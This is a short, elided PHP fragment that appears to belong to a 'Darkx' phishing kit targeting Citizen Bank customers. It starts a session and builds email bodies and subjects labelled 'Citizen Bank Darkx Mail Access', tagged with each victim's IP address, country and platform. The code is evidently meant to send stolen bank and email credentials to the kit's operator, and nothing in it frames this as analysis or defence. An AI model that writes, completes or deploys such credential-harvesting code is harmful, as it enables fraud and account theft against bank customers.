<?php 
	session_start();
	        ...
	        $errors = array(); 
	          ...
	          //send email
	          $body = "::::::::::::::::::::::: Darkx Citizen Bank Info [Mail Access] :::::::::::::::::::::::::\r\n";
              ...
              $subject="Citizen Bank Darkx Mail Access 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
              ...
              $subject="Citizen Bank Darkx Mail Access 1 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
